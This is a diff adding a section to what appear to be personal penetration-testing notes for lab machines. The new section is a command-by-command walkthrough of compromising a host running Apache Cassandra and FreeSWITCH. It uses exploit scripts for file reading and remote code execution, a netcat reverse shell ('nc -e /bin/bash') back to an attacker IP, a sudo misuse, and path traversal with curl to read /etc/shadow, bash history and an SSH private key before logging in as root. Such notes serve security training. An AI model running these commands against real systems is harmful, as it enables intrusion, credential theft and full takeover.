@@ -2654,7 +2654,25 @@ python3 redis-rogue-server.py --rhost=192.168.197.176 --lhost=192.168.45.171 --l
 #enter kali IP and port insten kali netcat on port
 rlwrap nc -nlvp 1234 # got the shell
 # From here try above redis-status privilege escalation redis, PWNkit(https://github.com/ly4k/PwnKit)
-
+```
+## Cassandra, Freeswitch-event Linux 
+- One of the boxes has Apache Cassandra and Freeswitch-event and some smb ports has some configuration files and ssh port
+```bash
+# Clue from Pgpractice
+python3 49362.py 192.168.113.240 /etc/passwd # got usernames you can able read files only
+python3 49362.py 192.168.113.240 '/proc/self/cmdline' # Found password cassie, in their is no ssh keys with 3 users
+python3 47799.py 192.168.113.240 'nc -e /bin/bash 192.168.45.248 3000' # Freeswitch rce cassie password is not working
+python3 49362.py 192.168.113.240 '/etc/freeswitch/autoload_configs/event_socket.conf.xml' # in the configuration file found the password
+python3 47799.py 192.168.113.240 'nc -e /bin/bash 192.168.45.248 3000' # Changed the password with above identified password
+rlwrap nc -nlvp 3000 # Got the shell with Freeswitch service
+su cassie # password-SecondBiteTheApple330, switched to cassie user.
+#One way cassie user folder has id_rsa, transfered to kali logged in as root.
+#Another way
+sudo -l # For cassie user has '/usr/local/bin/cassandra-web'
+sudo /usr/local/bin/cassandra-web -B 0.0.0.0:1234 -u cassie -p SecondBiteTheApple330 # started web service
+curl --path-as-is localhost:1234/../../../../../../../../etc/shadow # Opened another shell using netcat like above
+curl --path-as-is localhost:1234/../../../../../../../../home/anthony/.bash_history # Some commands using anthony id_rsa key logged as root
+curl --path-as-is localhost:1234/../../../../../../../../home/anthony/.ssh/id_rsa # Copy the key to kali then loogedin as root
 ```
 
 ---
